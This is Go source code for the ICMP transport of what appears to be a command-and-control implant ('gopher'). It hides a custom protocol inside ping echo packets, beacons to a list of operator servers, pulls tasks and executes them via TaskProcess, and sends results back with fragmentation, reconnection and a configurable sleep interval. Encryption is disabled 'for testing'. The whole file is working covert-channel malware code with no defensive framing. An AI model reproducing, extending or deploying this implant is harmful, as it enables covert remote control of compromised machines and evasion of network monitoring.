//go:build !windows
// +build !windows

package main

import (
	"encoding/binary"
	"gopher/utils"
	"net"
	"time"

	"github.com/vmihailenco/msgpack/v5"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// ICMP协议常量 - ICMP protocol constants
const (
	CUSTOM_HEADER_SIZE = 16
	TYPE_BEACON_DATA   = 0
	TYPE_REQUEST_REPLY = 1
	TYPE_ACK           = 2
	TYPE_TASK          = 3

	FRAGMENTED = 0x00000001
	FIRST_FRAG = 0x00000010
	LAST_FRAG  = 0x00000100
	FETCH_FRAG = 0x00001000
)

// ICMPHeader 自定义ICMP协议头
type ICMPHeader struct {
	Type          uint32
	Identifier    uint32
	Flags         uint32
	FragmentIndex uint32
}

// ICMPConnection ICMP连接结构
type ICMPConnection struct {
	conn            *icmp.PacketConn
	serverAddr      string
	identifier      uint32
	maxFragmentSize int
}

// NewICMPConnection 创建新的ICMP连接
func NewICMPConnection(serverAddr string, identifier uint32, maxFragmentSize int) (*ICMPConnection, error) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return nil, err
	}

	return &ICMPConnection{
		conn:            conn,
		serverAddr:      serverAddr,
		identifier:      identifier,
		maxFragmentSize: maxFragmentSize,
	}, nil
}

// Close 关闭连接
func (ic *ICMPConnection) Close() error {
	if ic.conn != nil {
		return ic.conn.Close()
	}
	return nil
}

// SendData 发送数据（带分片支持）
func (ic *ICMPConnection) SendData(data []byte) error {
	maxPayload := ic.maxFragmentSize - CUSTOM_HEADER_SIZE

	if len(data) <= maxPayload {
		// 单包发送
		return ic.sendPacket(TYPE_BEACON_DATA, 0, 0, data)
	}

	// 需要分片
	totalFrags := (len(data) + maxPayload - 1) / maxPayload

	for i := 0; i < totalFrags; i++ {
		start := i * maxPayload
		end := start + maxPayload
		if end > len(data) {
			end = len(data)
		}

		var flags uint32 = FRAGMENTED
		if i == 0 {
			flags |= FIRST_FRAG
		}
		if i == totalFrags-1 {
			flags |= LAST_FRAG
		}

		err := ic.sendPacket(TYPE_BEACON_DATA, flags, uint32(i), data[start:end])
		if err != nil {
			return err
		}

		// 等待ACK
		_, err = ic.waitForAck()
		if err != nil {
			return err
		}
	}

	return nil
}

// RequestResponse 请求并接收响应
func (ic *ICMPConnection) RequestResponse() ([]byte, error) {
	// 发送请求
	err := ic.sendPacket(TYPE_REQUEST_REPLY, 0, 0, nil)
	if err != nil {
		return nil, err
	}

	// 接收响应
	return ic.receiveData()
}

// sendPacket 发送单个ICMP包
func (ic *ICMPConnection) sendPacket(packetType uint32, flags uint32, fragIndex uint32, payload []byte) error {
	// 构建自定义协议头
	header := make([]byte, CUSTOM_HEADER_SIZE)
	binary.LittleEndian.PutUint32(header[0:4], packetType)
	binary.LittleEndian.PutUint32(header[4:8], ic.identifier)
	binary.LittleEndian.PutUint32(header[8:12], flags)
	binary.LittleEndian.PutUint32(header[12:16], fragIndex)

	fullPayload := append(header, payload...)

	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   int(ic.identifier & 0xFFFF),
			Seq:  int(fragIndex),
			Data: fullPayload,
		},
	}

	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	dst, err := net.ResolveIPAddr("ip4", ic.serverAddr)
	if err != nil {
		return err
	}

	_, err = ic.conn.WriteTo(msgBytes, dst)
	return err
}

// waitForAck 等待ACK响应
func (ic *ICMPConnection) waitForAck() (bool, error) {
	ic.conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	buffer := make([]byte, 65535)
	n, _, err := ic.conn.ReadFrom(buffer)
	if err != nil {
		return false, err
	}

	msg, err := icmp.ParseMessage(1, buffer[:n])
	if err != nil {
		return false, err
	}

	if msg.Type != ipv4.ICMPTypeEchoReply {
		return false, nil
	}

	echo, ok := msg.Body.(*icmp.Echo)
	if !ok || len(echo.Data) < CUSTOM_HEADER_SIZE {
		return false, nil
	}

	header := parseHeader(echo.Data[:CUSTOM_HEADER_SIZE])
	return header.Type == TYPE_ACK, nil
}

// receiveData 接收数据（支持分片重组）
func (ic *ICMPConnection) receiveData() ([]byte, error) {
	ic.conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	var result []byte
	fragIndex := uint32(0)

	for {
		buffer := make([]byte, 65535)
		n, _, err := ic.conn.ReadFrom(buffer)
		if err != nil {
			return nil, err
		}

		msg, err := icmp.ParseMessage(1, buffer[:n])
		if err != nil {
			continue
		}

		if msg.Type != ipv4.ICMPTypeEchoReply {
			continue
		}

		echo, ok := msg.Body.(*icmp.Echo)
		if !ok || len(echo.Data) < CUSTOM_HEADER_SIZE {
			continue
		}

		header := parseHeader(echo.Data[:CUSTOM_HEADER_SIZE])
		if header.Type != TYPE_TASK {
			continue
		}

		payload := echo.Data[CUSTOM_HEADER_SIZE:]
		result = append(result, payload...)

		if header.Flags&FRAGMENTED == 0 || header.Flags&LAST_FRAG != 0 {
			break
		}

		// 请求下一个分片
		fragIndex++
		err = ic.sendPacket(TYPE_REQUEST_REPLY, FETCH_FRAG, fragIndex, nil)
		if err != nil {
			return nil, err
		}
	}

	return result, nil
}

// parseHeader 解析协议头
func parseHeader(data []byte) ICMPHeader {
	return ICMPHeader{
		Type:          binary.LittleEndian.Uint32(data[0:4]),
		Identifier:    binary.LittleEndian.Uint32(data[4:8]),
		Flags:         binary.LittleEndian.Uint32(data[8:12]),
		FragmentIndex: binary.LittleEndian.Uint32(data[12:16]),
	}
}

// RunICMPLoop ICMP通信主循环
// 注意: prof 参数仅用于初始化，循环中使用全局 profile 以支持 sleep 命令动态修改
func RunICMPLoop(prof utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
	addrIndex := 0

	for i := 0; i < prof.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(prof.ConnTimeout) * time.Second)
			addrIndex = (addrIndex + 1) % len(prof.Addresses)
		}

		// 创建ICMP连接
		icmpConn, err := NewICMPConnection(prof.Addresses[addrIndex], agentId, prof.MaxFragmentSize)
		if err != nil {
			continue
		}

		// 发送初始化消息
		err = icmpConn.SendData(initMsg)
		if err != nil {
			icmpConn.Close()
			continue
		}

		i = 0 // 重置重连计数

		// 通信循环
		for ACTIVE {
			// 请求任务
			recvData, err := icmpConn.RequestResponse()
			if err != nil {
				break
			}

			if len(recvData) == 0 {
				// 使用全局 profile.SleepTime，支持 sleep 命令动态修改
				time.Sleep(time.Duration(profile.SleepTime) * time.Second)
				continue
			}

			var inMessage utils.Message

			// TODO: 测试阶段暂时禁用加密，功能测试通过后启用
			// TODO: Encryption disabled for testing, enable after functionality test passes
			/*
				recvData, err = utils.DecryptData(recvData, sessionKey)
				if err != nil {
					break
				}
			*/

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			outMessage := utils.Message{Type: 0}
			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ := msgpack.Marshal(outMessage)
			// TODO: 测试阶段暂时禁用加密，功能测试通过后启用
			// TODO: Encryption disabled for testing, enable after functionality test passes
			// sendData, _ = utils.EncryptData(sendData, sessionKey)

			err = icmpConn.SendData(sendData)
			if err != nil {
				break
			}
		}

		icmpConn.Close()
	}
}
